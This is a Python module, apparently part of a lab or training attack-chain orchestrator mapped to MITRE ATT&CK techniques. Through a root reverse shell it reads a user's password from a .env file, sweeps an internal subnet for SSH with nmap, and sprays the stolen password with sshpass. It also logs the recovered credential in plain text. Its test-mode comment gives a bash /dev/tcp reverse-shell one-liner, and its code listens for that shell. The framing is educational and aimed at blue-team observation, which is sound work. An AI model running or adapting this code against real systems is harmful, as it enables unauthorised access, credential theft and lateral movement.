import re
import shlex
import socket
import time

from chainlog import log

# =============================================================================
# credential_stuffing.py — Discover internal SSH hosts + spray john's password
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
#   T1018     – Remote System Discovery  (nmap sweep of internal_net)
#   T1046     – Network Service Discovery (ssh service enumeration)
#   T1110.004 – Brute Force: Credential Stuffing  (reuse john's password)
#   T1021.004 – Remote Services: SSH      (the auth vector)
# -----------------------------------------------------------------------------
# Runs FROM apache via the root reverse shell — the only egress point that
# reaches internal_net :22 (router FORWARD drops External→Internal SSH;
# DMZ→Internal SSH is allowed).
#
# The educator-facing "what a pentester actually types" is `nxc ssh` from kali
# (netexec is installed in the kali image). The orchestrator can't use it
# end-to-end because of the router rules, so it emulates the same TTP shape
# with nmap + sshpass executed inside apache. See Documentation/attack_plan.md.
# =============================================================================

ENV_FILE_PATH    = "/home/john.stravidis/.env"
INTERNAL_SUBNET  = "10.30.0.0/24"
TARGET_USERNAME  = "john.stravidis"
SSH_PORT         = 22
SCAN_OUTPUT_FILE = "/tmp/cs-scan.gnmap"

# Noise file patterns searched before the real .env read (T1552.001).
# Each tuple is (filename, list_of_dirs_to_search).  All searches are
# expected to come up empty — the point is to generate observable events in
# the scenario log and the apache shell history that a blue team can correlate.
_NOISE_FILE_PATTERNS = [
    ("passwords.txt",   ["/home", "/root", "/tmp", "/var/www", "/opt"]),
    ("secrets.json",    ["/home", "/root", "/tmp", "/var/www", "/opt"]),
    ("config.backup",   ["/home", "/root", "/tmp", "/etc",     "/opt"]),
    ("credentials.txt", ["/home", "/root", "/tmp",             "/opt"]),
    (".passwd",         ["/home", "/root",                     "/opt"]),
    ("db_password.txt", ["/home", "/root",                     "/opt"]),
]

# Hosts to exclude from the spray attempt — pure infrastructure addresses
# that would noise up the log without ever serving sshd-on-22 for `john`:
#   .1   bridge gateway
#   .2   apache itself (we're already root here)
#   .3   router's public leg
#   .4   router's internal leg
#   .6   db-internal (postgres only, no sshd)
_SKIP_HOSTS = {"10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4", "10.30.0.6"}


_sentinel_seq = 0


def _drain(shell):
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=10):
    """Send cmd through `shell`, return captured stdout up to a sentinel echo."""
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"CS_SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.4)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev_timeout = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev_timeout)

    if sentinel in buf:
        buf = buf[:buf.index(sentinel)]
    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    buf = buf.replace("\r", "")
    return buf.strip()


def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
    """Pull the first matching `VAR=value` line out of an .env blob."""
    for var in var_names:
        m = re.search(rf"^{re.escape(var)}=(.+)$", env_text, re.MULTILINE)
        if m:
            return m.group(1).strip().strip('"').strip("'")
    return None


def _search_noise_files(shell):
    """Search for common sensitive file patterns via the root shell.

    All searches are expected to return nothing — the function exists purely
    to generate log-visible noise events (T1552.001) that a blue team can
    observe when analysing the scenario.  The log lines and the `find`
    commands sent through the shell both appear in scenario logs and apache
    shell history respectively.

    Matches are detected via a `-printf` marker rather than "any output":
    the root reverse shell echoes a PS1 prompt (and, on some shells, the
    command itself) into every `_run_remote` capture, so a plain emptiness
    check would treat that prompt noise as a hit and fire the `[?]` branch on
    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
    real finds.
    """
    log("[*] Expanding credential search to common sensitive file patterns...")
    for filename, dirs in _NOISE_FILE_PATTERNS:
        search_dirs = " ".join(dirs)
        cmd = (
            f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
        )
        out = _run_remote(shell, cmd, timeout=10)
        hits = [
            line[len("CS_NOISE_HIT "):]
            for line in out.splitlines()
            if line.startswith("CS_NOISE_HIT ")
        ]
        if hits:
            log(f"[?] Unexpected find for {filename!r}: {', '.join(hits)}")
        else:
            log(f"[-] {filename!r} not found in {search_dirs}")
    log("[*] Noise search complete — no additional credential files discovered")


def _parse_gnmap_hosts(gnmap_text):
    """Return a list of IPs whose grepable-nmap line shows port 22/open."""
    hosts = []
    for line in gnmap_text.splitlines():
        if not line.startswith("Host:"):
            continue
        if "22/open" not in line:
            continue
        m = re.search(r"Host:\s+(\S+)", line)
        if m:
            hosts.append(m.group(1))
    return hosts


def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
    """
    Execute the credential-stuffing step on apache via the root shell.

    Returns a dict with:
        john_ip       — host the credentials worked on (or None)
        john_password — the password recovered from the env file
        scanned_hosts — list of internal hosts found with open :22
        successes     — list of (host, user) pairs sshpass authenticated to
    """
    log("\n[*] Starting credential stuffing (host discovery + password spray)...")

    # ------------------------------------------------------------------
    # Phase 1 — Credentials in files (T1552.001)
    # Noise searches first (always fail), then the real .env read.
    # ------------------------------------------------------------------
    _search_noise_files(root_shell)
    log(f"[*] Reading {ENV_FILE_PATH} on apache...")
    env_blob = _run_remote(root_shell, f"cat {ENV_FILE_PATH}")
    password = _extract_password(env_blob)
    if not password:
        log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
        log(f"[?] File contents: {env_blob!r}")
        return {"john_ip": None, "john_password": None, "scanned_hosts": [], "successes": []}
    log(f"[+] Recovered credential: {target_user} / {password}")

    # ------------------------------------------------------------------
    # Phase 2 — Network discovery (T1018 / T1046)
    # ------------------------------------------------------------------
    log(f"[*] Scanning {subnet} for live SSH hosts (nmap from apache)...")
    scan_cmd = (
        f"nmap -Pn -n -p {SSH_PORT} --open "
        f"-oG {SCAN_OUTPUT_FILE} {subnet} >/dev/null && "
        f"cat {SCAN_OUTPUT_FILE}"
    )
    scan_out = _run_remote(root_shell, scan_cmd, timeout=60)
    discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
    if not discovered:
        log(f"[-] No SSH hosts discovered on {subnet}")
        _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
        return {"john_ip": None, "john_password": password, "scanned_hosts": [], "successes": []}
    log(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")

    # ------------------------------------------------------------------
    # Phase 3 — Credential stuffing (T1110.004 / T1021.004)
    # ------------------------------------------------------------------
    log(f"[*] Spraying {target_user} credentials across {len(discovered)} host(s)...")
    successes = []
    for host in discovered:
        attempt = (
            f"sshpass -p {shlex.quote(password)} ssh "
            f"-o StrictHostKeyChecking=accept-new "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o PasswordAuthentication=yes "
            f"-o PubkeyAuthentication=no "
            f"-o PreferredAuthentications=password "
            f"-o ConnectTimeout=5 "
            f"-o NumberOfPasswordPrompts=1 "
            f"-p {SSH_PORT} "
            f"{target_user}@{host} id"
        )
        out = _run_remote(root_shell, attempt, timeout=15)
        if "uid=" in out and target_user in out:
            log(f"[+] {host:<14} {target_user}:{password}  → AUTH OK")
            successes.append((host, target_user))
        else:
            log(f"[-] {host:<14} {target_user}:{password}  → denied")

    # ------------------------------------------------------------------
    # Phase 4 — Cleanup + return
    # ------------------------------------------------------------------
    _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")

    if not successes:
        log("[-] Credential stuffing did not authenticate on any host")
        return {
            "john_ip": None,
            "john_password": password,
            "scanned_hosts": discovered,
            "successes": [],
        }

    john_ip = successes[0][0]
    log(f"[+] Credential stuffing successful! {target_user} reachable at {john_ip}")
    return {
        "john_ip": john_ip,
        "john_password": password,
        "scanned_hosts": discovered,
        "successes": successes,
    }


# Test mode — same pattern as the other chain modules.
# Usage: docker compose exec kali python3 /Attack-chain/credential_stuffing.py
# Then in another terminal, on apache:
#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
if __name__ == "__main__":
    log("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        log(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    log(f"\n[*] Result: {result}")
